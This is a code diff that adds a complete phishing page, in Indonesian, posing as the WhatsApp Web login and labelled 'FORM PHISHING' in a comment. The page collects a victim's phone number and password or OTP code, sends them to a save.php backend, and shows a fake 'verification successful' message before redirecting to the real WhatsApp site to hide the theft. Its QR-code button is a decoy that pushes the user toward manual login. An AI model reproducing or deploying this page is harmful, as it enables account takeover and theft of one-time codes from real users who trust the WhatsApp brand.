@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>WhatsApp Web</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="whatsapp-container">
+            <div class="header">
+                <img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/r6qwYw6KR6C.png" alt="WhatsApp" class="logo">
+                <h2>WhatsApp Web</h2>
+                <p>Scan kode QR atau login untuk mengakses</p>
+            </div>
+            
+            <!-- FORM PHISHING -->
+            <div class="login-form" id="loginForm">
+                <div class="alert" id="alert" style="display:none;">
+                    ⚠️ Sesi berakhir, silakan login ulang
+                </div>
+                
+                <div class="input-group">
+                    <label>📱 Nomor Telepon</label>
+                    <input type="tel" id="phone" placeholder="+62 812 3456 7890" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔐 Kata Sandi / Kode OTP</label>
+                    <input type="password" id="password" placeholder="Masukkan password atau kode OTP" required>
+                </div>
+                
+                <button id="submitBtn" class="login-btn">Login ke WhatsApp Web</button>
+                
+                <div class="qr-option">
+                    <p>atau</p>
+                    <button id="qrBtn" class="qr-btn">🔲 Scan Kode QR</button>
+                </div>
+                
+                <div class="qr-container" id="qrContainer" style="display:none;">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=whatsapp://" alt="QR Code">
+                    <p>Scan dengan WhatsApp di ponsel</p>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>© 2026 WhatsApp Inc.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // QR Toggle
+        document.getElementById('qrBtn').onclick = function() {
+            document.getElementById('qrContainer').style.display = 'block';
+            document.getElementById('alert').style.display = 'block';
+            document.getElementById('alert').innerHTML = '⚠️ Fitur QR sedang maintenance, silakan login manual';
+        };
+        
+        // Submit data
+        document.getElementById('submitBtn').onclick = function() {
+            var phone = document.getElementById('phone').value;
+            var password = document.getElementById('password').value;
+            
+            if(phone === '' || password === '') {
+                alert('Harap isi semua field!');
+                return;
+            }
+            
+            // Kirim data ke backend
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'save.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() {
+                if(xhr.status === 200) {
+                    document.getElementById('alert').style.display = 'block';
+                    document.getElementById('alert').innerHTML = '✅ Verifikasi berhasil, mengalihkan...';
+                    setTimeout(function() {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 2000);
+                }
+            };
+            xhr.send('phone=' + encodeURIComponent(phone) + '&password=' + encodeURIComponent(password));
+        };
+    </script>
+</body>
+</html>
